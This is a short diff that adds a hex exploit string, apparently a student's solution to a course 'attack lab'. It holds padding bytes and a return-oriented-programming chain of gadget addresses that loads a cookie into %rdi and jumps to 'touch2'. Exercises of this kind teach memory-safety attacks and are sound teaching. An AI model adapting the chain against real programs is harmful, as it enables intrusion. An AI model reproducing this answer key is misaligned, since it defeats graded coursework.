@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+99 14 40 00 00 00 00 00 /* gadget addr. for pop %rax; 0x401499 */
+dd d2 3c 78 00 00 00 00 /* cookie to pop into %rax; 0x783cd2dd */
+a4 14 40 00 00 00 00 00 /* gadget addr. for mov %rax; %rdi; 0x4014a4 */
+e8 12 40 00 00 00 00 00 /* address for touch2 */
